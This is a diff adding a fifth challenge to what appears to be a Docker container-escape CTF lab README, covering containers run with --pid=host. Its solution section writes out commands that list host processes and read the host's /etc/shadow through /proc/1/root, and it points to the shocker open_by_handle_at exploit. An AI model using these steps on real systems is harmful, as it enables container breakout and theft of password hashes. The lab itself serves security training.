@@ -116,3 +116,21 @@ docker run --rm -it --cap-add=DAC_READ_SEARCH ctf-dac
   gcc shocker.c -o shocker
   ```
 </details>
+
+## chall05 - --pid=host
+
+```
+docker build -t ctf-pidhost .
+docker run --rm -it --pid=host ctf-pidhost
+```
+
+<details>
+  <summary>Solution</summary>
+
+  1. Use shoker exploit that uses `open_by_handle_at()` and run it
+  ```
+  ps aux                      # check all processes on host
+  ls -la /proc/1/root/        # access FS of a process
+  cat /proc/1/root/etc/shadow 2>/dev/null
+  ```
+</details>
